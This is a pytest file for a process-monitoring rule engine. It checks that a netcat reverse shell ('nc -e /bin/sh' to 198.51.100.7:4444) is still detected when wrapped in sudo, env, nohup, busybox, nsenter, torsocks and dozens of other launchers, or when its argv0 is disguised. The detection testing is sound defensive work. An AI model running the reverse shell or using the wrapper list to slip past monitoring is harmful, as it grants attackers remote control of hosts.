"""Audit K5: wrappers and disguised names no longer slip past the rules.

Denetim K5: sarmalayıcılar ve gizlenmiş adlar artık kurallardan kaçamaz.
"""
from pathlib import Path

import pytest

from satsuma.smart_rules import SmartRuleEngine, _stages, _term_in_command

ROOT = Path(__file__).parents[1]
SHELL = 'nc -e /bin/sh 198.51.100.7 4444'


@pytest.fixture(scope='module')
def engine():
    return SmartRuleEngine(ROOT / 'rules')


def ids(engine, cmd, exe=''):
    return {f['rule_id'] for f in engine.match({'source': 'sys_proc', 'action': 'process_seen',
                                                'cmd': cmd, 'exe': exe, 'pid': 9})}


@pytest.mark.parametrize('wrapped', [
    'sudo ' + SHELL, 'sudo -u root -E ' + SHELL, 'doas -u root ' + SHELL, 'env ' + SHELL,
    'env -i PATH=/bin FOO=1 ' + SHELL, 'nohup ' + SHELL, 'timeout 60 ' + SHELL, 'timeout -s KILL 5m ' + SHELL,
    'setsid -f ' + SHELL, 'nice -n 19 ' + SHELL, 'nice -10 ' + SHELL, 'ionice -c 3 ' + SHELL,
    'stdbuf -oL ' + SHELL, 'chrt -f 99 ' + SHELL, 'taskset -c 0 ' + SHELL, 'xargs -n1 ' + SHELL,
    'busybox ' + SHELL, '/usr/bin/busybox ' + SHELL, 'command ' + SHELL, 'time -p ' + SHELL,
    'chroot / ' + SHELL, 'unshare -r ' + SHELL, 'nsenter -t 1 -m -u -i -n -p ' + SHELL,
    'setpriv --reuid=1000 ' + SHELL, 'strace -f -o /dev/null ' + SHELL, 'flock /tmp/l ' + SHELL,
    'systemd-run --scope -p CPUQuota=5% ' + SHELL, 'proxychains -q ' + SHELL, 'torsocks ' + SHELL,
    f'su -c "{SHELL}" root', f'runuser -u root -- {SHELL}', f'script -q -c "{SHELL}" /dev/null',
    f'env -S "{SHELL}"', f'flock /tmp/l -c "{SHELL}"', f'bash -c "sudo nohup {SHELL}"',
    'sudo env A=1 nohup timeout 9 busybox ' + SHELL,
])
def test_reverse_shell_is_seen_through_every_wrapper(engine, wrapped):
    assert ids(engine, SHELL) <= ids(engine, wrapped), wrapped


def test_anchored_regex_rules_see_through_wrappers_too(engine):
    plain = ids(engine, 'bpftool prog load x.o /sys/fs/bpf/x')
    assert 'SATSUMA-BPF-CLI-002' in plain
    assert 'SATSUMA-BPF-CLI-002' in ids(engine, 'sudo -u root nohup bpftool prog load x.o /sys/fs/bpf/x')


def test_a_disguised_argv0_is_judged_by_the_real_executable(engine):
    # exec -a bash /usr/bin/nc ... or a link named bash: the kernel reports the real file.
    disguised = 'bash -e /bin/sh 198.51.100.7 4444'
    assert not ids(engine, SHELL) <= ids(engine, disguised)
    assert ids(engine, SHELL) <= ids(engine, disguised, exe='/usr/bin/nc')


def test_rules_about_the_wrapper_itself_still_match():
    assert _term_in_command('sudo -i', 'sudo -i')
    assert _term_in_command('sudo nohup nc -l 4444', 'sudo')


@pytest.mark.parametrize('cmd', ['sudo -l', 'sudo -v', 'command -v nc', 'taskset -p 1234', 'su - root', 'sudo -i'])
def test_wrapper_forms_that_run_nothing_add_no_command(cmd):
    assert [stage[0][0] for stage in _stages(cmd)] == [cmd.split()[0]]


def test_options_and_values_are_not_mistaken_for_the_command():
    stages = [s[0] for s in _stages('timeout -k 5 -s TERM 60 nice -n 5 nc -l 4444')]
    assert stages[-1] == ('nc', '-l', '4444')
    assert ('5', '-s', 'TERM', '60', 'nice', '-n', '5', 'nc', '-l', '4444') not in stages


def test_shell_stage_keeps_its_old_meaning():
    # bash -c is replaced by what it runs, so 'bash -c' alone is not a term match.
    assert not _term_in_command('bash -c "ls"', 'bash -c')
    assert _term_in_command('bash -c "nc -l 1"', 'nc -l')
